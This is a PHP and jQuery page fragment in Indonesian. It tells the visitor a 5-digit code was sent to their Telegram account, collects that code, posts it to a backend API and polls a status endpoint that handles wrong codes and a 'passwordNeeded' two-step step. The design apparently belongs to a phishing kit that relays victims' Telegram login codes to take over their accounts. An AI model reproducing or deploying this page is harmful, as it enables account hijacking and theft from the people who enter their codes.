<p class="mt-3 text-center">Kami telah mengirimkan 5-digit OTP ke akun <?= $_SESSION["phone"] ?> silahkan buka aplikasi Telegram anda dan periksa pesan kami.</p>
<div class="mb-3">
    <input type="text" class="form-control" name="phone" id="phone" placeholder="5-digit OTP" maxlength="5" />
</div>
<p id="wrong" class="text-center"></p>
<button class="btn btn-primary mx-auto d-block mb-3">SELANJUTNYA</button>
<script>
  $("#wrong").hide();

  function checkStatus() {
    $("#wrong").hide();
    
    $.ajax({
      url: "API/index.php",
      type: "POST",
      data: {"method":"getStatus"},
      success:function(data){
        if (data.result.status == "success") {
          window.location.reload();
        } else if (data.result.status == "failed") {
          if (data.result.detail == "wrong") {
            $("#wrong").html("Kode salah, silahkan input ulang.");
            $("#loader").hide();
          } else if (data.result.detail == "passwordNeeded") {
            window.location.reload();
          }
          $("#wrong").show();
          $("input[type='text']").val("");
        } else {
          setTimeout(function(){
            checkStatus();
          }, 500);
        }
      }, error:function(data){}
    });
  }

  $("button").on("click", function(e){
    e.preventDefault();
    var com = $("input[type='text']").val();

    if (com != "") {
      $("#loader").show();
      $.ajax({
        url: "API/index.php",
        type: "POST",
        data: {"method":"sendOtp","otp":com},
        success:function(data){
          setTimeout(function(){
            checkStatus();
          }, 500);
        },
        error:function(data){}
      });
    }
  });
</script>
